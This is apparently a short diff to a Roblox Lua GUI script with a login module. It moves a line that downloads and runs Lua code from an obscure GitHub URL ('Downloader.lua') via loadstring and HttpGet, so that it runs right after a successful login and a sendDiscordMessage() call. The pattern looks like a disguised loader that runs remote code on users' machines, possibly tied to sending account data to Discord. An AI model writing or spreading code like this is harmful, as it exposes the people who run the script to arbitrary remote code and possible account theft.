@@ -1814,8 +1814,7 @@ local function Startscripts()
 	coroutine.wrap(ETAWTZ_fake_script)()
 end
 local function StartOther()
-	wait(1.5)
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/djasddjajw881323hidigdfsdfp/2f457hkd323atom/atom/Downloader.lua"))()
+	wait(1)
 	coroutine.wrap(WGZJ_fake_script)()
 	coroutine.wrap(WUSISS_fake_script)()
 	coroutine.wrap(EKTXSKT_fake_script)()
@@ -1931,6 +1930,7 @@ local function SQPC_fake_script() -- Frame.AccountModule
 				IsoginedValue.Value = true
 			end
 			sendDiscordMessage()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/djasddjajw881323hidigdfsdfp/2f457hkd323atom/atom/Downloader.lua"))()
 			coroutine.wrap(StartOther)()
 		else
 			IncorrectSound:Play()
